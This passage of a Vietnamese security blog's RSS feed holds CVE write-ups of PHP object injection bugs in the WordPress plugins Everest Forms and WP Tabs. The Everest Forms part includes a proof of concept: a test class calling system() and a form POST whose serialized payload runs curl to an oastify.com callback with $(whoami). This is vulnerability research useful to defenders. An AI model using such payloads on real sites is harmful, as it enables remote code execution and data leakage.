1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;T·∫°o class ƒë·ªÉ test ƒë·∫∑t trong &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Evil&#xA;{&#xA;    public $command = &amp;#34;ls /&amp;#34;;&#xA;    public function __destruct()&#xA;    {&#xA;        die(system($this-&amp;gt;command));&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Submit form v·ªõi gi√° tr·ªã ƒë∆∞·ª£c encode JSON ch·ª©a chu·ªói serialized:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /2025/11/22/test/ HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;&#xA;Content-Disposition: form-data; name=&amp;#34;everest_forms[form_fields][fullname]&amp;#34;&#xA;&#xA;{&amp;#34;value&amp;#34;:&amp;#34;a:1:{i:0;O:4:\&amp;#34;Evil\&amp;#34;:1:{s:7:\&amp;#34;command\&amp;#34;;s:74:\&amp;#34;curl http:\/\/3hl5b0qvv7r0okj81wizv1kmddj47uvj.oastify.com?leadked=$(whoami)\&amp;#34;;}}&amp;#34;}&#xA;------geckoformboundary8355bd6da3783bb27aa92837fe803a6e&#xA;...&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Administrator xem entry ƒë∆∞·ª£c submit&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-25-cve-2025-3439/result.png&#34; title=&#34;K·∫øt qu·∫£&#34; data-thumbnail=&#34;/posts/2025-11-25-cve-2025-3439/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;K·∫øt qu·∫£&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-25-cve-2025-3439/result.png&#39; alt=&#34;Result&#34; height=&#34;614&#34; width=&#34;1119&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K·∫øt qu·∫£&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng t·ªìn t·∫°i do vi·ªác &lt;strong&gt;unserialize d·ªØ li·ªáu ng∆∞·ªùi d√πng tr·ª±c ti·∫øp th√¥ng qua &lt;code&gt;maybe_unserialize()&lt;/code&gt;&lt;/strong&gt; m√† kh√¥ng gi·ªõi h·∫°n l·ªõp ƒë∆∞·ª£c ph√©p kh·ªüi t·∫°o. ƒêi·ªÅu n√†y d·∫´n t·ªõi kh·∫£ nƒÉng &lt;strong&gt;PHP Object Injection&lt;/strong&gt;, v√† trong m√¥i tr∆∞·ªùng c√≥ s·∫µn chu·ªói POP, k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c c√≥ th·ªÉ th·ª±c hi·ªán c√°c h√†nh ƒë·ªông nguy hi·ªÉm nh∆∞ ƒë·ªçc, ghi, x√≥a file ho·∫∑c th·∫≠m ch√≠ th·ª±c thi m√£ t·ª´ xa. B·∫£n v√° s·ª≠ d·ª•ng &lt;code&gt;evf_maybe_unserialize()&lt;/code&gt; v·ªõi &lt;code&gt;allowed_classes =&amp;gt; false&lt;/code&gt; ƒë√£ tri·ªát ti√™u ho√†n to√†n nguy c∆° n√†y.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Root cause&lt;/strong&gt;: s·ª≠ d·ª•ng &lt;code&gt;maybe_unserialize()&lt;/code&gt; tr√™n d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng m√† kh√¥ng ki·ªÉm so√°t l·ªõp ƒë∆∞·ª£c ph√©p t·∫°o ra.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Impact&lt;/strong&gt;: Object Injection v√† c√≥ th·ªÉ ti·∫øn t·ªõi RCE n·∫øu t·ªìn t·∫°i POP chain t·ª´ plugin ho·∫∑c theme kh√°c.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Attack surface&lt;/strong&gt;: B·ªã trigger khi admin m·ªü trang xem Entries; d·ªØ li·ªáu ƒë·ªôc h·∫°i ƒë√£ t·ªìn t·∫°i t·ª´ ph·∫ßn submit form.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Fix&lt;/strong&gt;: S·ª≠ d·ª•ng &lt;code&gt;unserialize()&lt;/code&gt; v·ªõi t√πy ch·ªçn &lt;code&gt;allowed_classes = false&lt;/code&gt;, ngƒÉn ch·∫∑n t·∫°o object t·ª´ d·ªØ li·ªáu kh√¥ng tin c·∫≠y.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Lesson learned&lt;/strong&gt;: M·ªçi d·ªØ li·ªáu unserialize ph·∫£i ƒë∆∞·ª£c h·∫°n ch·∫ø l·ªõp, l·ªçc ho·∫∑c chuy·ªÉn sang c√°c ƒë·ªãnh d·∫°ng an to√†n h∆°n nh∆∞ JSON.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/everest-forms/vulnerability/wordpress-everest-forms-plugin-3-1-1-unauthenticated-php-object-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Everest Forms Plugin &amp;lt;= 3.1.1 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-48134 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-24-cve-2025-48134/</link>
      <pubDate>Mon, 24 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-24-cve-2025-48134/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-24-cve-2025-48134/app.gif&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng Deserialization of Untrusted Data trong ShapedPlugin LLC WP Tabs cho ph√©p Object Injection. V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn WP Tabs: t·ª´ n/a cho ƒë·∫øn phi√™n b·∫£n 2.2.12.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-48134&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-48134&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.2.12&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.2.13&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Administrator&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: [WordPress WP Tabs Plugin]https://wordpress.org/plugins/wp-expand-tabs-free/)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;WP Tabs&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.2.12&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.2.13&lt;/code&gt; ‚Äì **patched&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phi√™n b·∫£n l·ªói (v2.2.12):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$sanitize_value = $this-&amp;gt;sanitize_and_collect_metabox_data( $key, maybe_unserialize( str_replace( &amp;#39;{#ID#}&amp;#39;, $new_tabs_id, $value ) ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong ƒëo·∫°n m√£ n√†y, h√†m &lt;strong&gt;&lt;code&gt;maybe_unserialize()&lt;/code&gt;&lt;/strong&gt; ƒë∆∞·ª£c g·ªçi tr·ª±c ti·∫øp tr√™n d·ªØ li·ªáu ng∆∞·ªùi d√πng (&lt;code&gt;$value&lt;/code&gt; sau khi replace &lt;code&gt;&#39;{#ID#}&#39;&lt;/code&gt; b·∫±ng &lt;code&gt;$new_tabs_id&lt;/code&gt;). ƒêi·ªÅu n√†y t·∫°o ra l·ªó h·ªïng nghi√™m tr·ªçng:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Nguy c∆° Object Injection&lt;/strong&gt;: N·∫øu attacker ch√®n payload PHP object v√†o d·ªØ li·ªáu base64, qu√° tr√¨nh decode v√† unserialize s·∫Ω kh·ªüi t·∫°o object ƒë·ªôc h·∫°i, d·∫´n ƒë·∫øn &lt;strong&gt;Object Injection&lt;/strong&gt; v√† c√≥ kh·∫£ nƒÉng ti·∫øn t·ªõi &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Thi·∫øu ki·ªÉm tra an to√†n&lt;/strong&gt;: Kh√¥ng c√≥ b∆∞·ªõc x√°c th·ª±c d·ªØ li·ªáu tr∆∞·ªõc khi th·ª±c hi·ªán unserialize.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Kh√¥ng c√≥ c∆° ch·∫ø fallback&lt;/strong&gt;: N·∫øu d·ªØ li·ªáu kh√¥ng h·ª£p l·ªá ho·∫∑c b·ªã l·ªói, h·ªá th·ªëng kh√¥ng c√≥ ph∆∞∆°ng √°n x·ª≠ l√Ω thay th·∫ø, khi·∫øn ·ª©ng d·ª•ng d·ªÖ b·ªã khai th√°c.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n v√° (v2.2.13):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-24-cve-2025-48134/diff.png&#34; title=&#34;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&#34; data-thumbnail=&#34;/posts/2025-11-24-cve-2025-48134/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-24-cve-2025-48134/diff.png&#39; alt=&#34;Diff&#34; height=&#34;320&#34; width=&#34;1914&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° ƒë√£ s·ª≠ d·ª•ng &lt;code&gt;unserialize&lt;/code&gt; v·ªõi option &lt;code&gt;&#39;allowed_classes&#39; =&amp;gt; false&lt;/code&gt; ƒë√£ lo·∫°i b·ªè ho√†n to√†n kh·∫£ nƒÉng t·∫°o object, t·ª´ ƒë√≥ x·ª≠ l√Ω tri·ªát ƒë·ªÉ l·ªó h·ªïng.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω m·ªôt ajax d√†nh cho ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p (&lt;code&gt;wp_ajax_&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;loader-&amp;gt;add_action( &amp;#39;wp_ajax_tabs_import_shortcode&amp;#39;, $import_export, &amp;#39;import_shortcode&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi truy c·∫≠p endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; v·ªõi &lt;code&gt;action=tabs_import_shortcode&lt;/code&gt; th√¨ callback &lt;code&gt;import_shortcode&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c g·ªçi&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function import_shortcode() {&#xA;    $nonce = ( ! empty( $_POST[&amp;#39;nonce&amp;#39;] ) ) ? sanitize_text_field( wp_unslash( $_POST[&amp;#39;nonce&amp;#39;] ) ) : &amp;#39;&amp;#39;;&#xA;    if ( ! wp_verify_nonce( $nonce, &amp;#39;wptabspro_options_nonce&amp;#39; ) ) {&#xA;        wp_send_json_error( array( &amp;#39;message&amp;#39; =&amp;gt; esc_html__( &amp;#39;Error: Nonce verification has failed. Please try again.&amp;#39;, &amp;#39;wp-expand-tabs-free&amp;#39; ) ), 401 );&#xA;    }&#xA;    $allow_tags = isset( $_POST[&amp;#39;unSanitize&amp;#39;] ) ? sanitize_text_field( wp_unslash( $_POST[&amp;#39;unSanitize&amp;#39;] ) ) : &amp;#39;&amp;#39;;&#xA;    // Don&amp;#39;t worry sanitize after JSON decode below.&#xA;    $data         = isset( $_POST[&amp;#39;shortcode&amp;#39;] ) ? wp_unslash( $_POST[&amp;#39;shortcode&amp;#39;] ) : &amp;#39;&amp;#39;;//phpcs:ignore&#xA;    $data       = json_decode( $data );&#xA;    $data       = json_decode( $data, true );&#xA;    $shortcodes = $allow_tags ? $data[&amp;#39;shortcode&amp;#39;] : wp_kses_post_deep( $data[&amp;#39;shortcode&amp;#39;] );&#xA;    if ( ! $data ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Nothing to import.&amp;#39;, &amp;#39;wp-expand-tabs-free&amp;#39; ),&#xA;            ),&#xA;            400&#xA;        );&#xA;    }&#xA;&#xA;    $status = $this-&amp;gt;import( $shortcodes );&#xA;&#xA;    if ( is_wp_error( thing: $status ) ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                &amp;#39;message&amp;#39; =&amp;gt; $status-&amp;gt;get_error_message(),&#xA;            ),&#xA;            400&#xA;        );&#xA;    }&#xA;&#xA;    wp_send_json_success( $status, 200 );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m th·ª±c hi·ªán ki·ªÉm tra nonce, n·∫øu kh√¥ng h·ª£p l·ªá th√¨ g·ª≠i error v√† d·ª´ng ch∆∞∆°ng tr√¨nh l·∫°i.&lt;/p&gt;&#xA;&lt;p&gt;Khi test c√°c ch·ª©c nƒÉng c·ªßa plugin, t√¥i th·∫•y ch·ª©c nƒÉng &lt;strong&gt;import&lt;/strong&gt; xu·∫•t hi·ªán ·ªü endpoint &lt;code&gt;/wp-admin/edit.php?post_type=sp_wp_tabs&amp;amp;page=tab_tools#tab=2&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-24-cve-2025-48134/search1.png&#34; title=&#34;Import feature&#34; data-thumbnail=&#34;/posts/2025-11-24-cve-2025-48134/search1.png&#34; data-sub-html=&#34;&lt;h2&gt;Import feature&lt;/h2&gt;&lt;p&gt;Import feature&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-24-cve-2025-48134/search1.png&#39; alt=&#34;Import feature&#34; height=&#34;519&#34; width=&#34;1238&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Import feature&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ch·ª©c nƒÉng n√†y ch·ªâ d√†nh cho Administrator, n√™n nonce h·ª£p l·ªá c≈©ng l√† nonce thu·ªôc v·ªÅ Administrator.&lt;/p&gt;&#xA;&lt;p&gt;D·ªØ li·ªáu trong JSON file ƒë∆∞·ª£c upload s·∫Ω ƒë∆∞·ª£c g√°n cho param &lt;code&gt;shortcode&lt;/code&gt; khi POST request ƒë∆∞·ª£c g·ª≠i.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$data       = isset( $_POST[&amp;#39;shortcode&amp;#39;] ) ? wp_unslash( $_POST[&amp;#39;shortcode&amp;#39;] ) : &amp;#39;&amp;#39;;//phpcs:ignore&#xA;$data       = json_decode( $data );&#xA;$data       = json_decode( $data, true );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Plugin l·∫•y d·ªØ li·ªáu n√†y v√† th·ª±c hi·ªán decode JSON 2 l·∫ßn. ·ªû l·∫ßn 2 v·ªõi tham s·ªë th·ª© 2 &lt;code&gt;associative=true&lt;/code&gt; th√¨ JSON s·∫Ω ƒë∆∞·ª£c convert sang array trong PHP theo m√¥ t·∫£ c·ªßa h√†m:&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition quote open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Tr√≠ch d·∫´n&lt;/div&gt;&#xA;  &lt;div 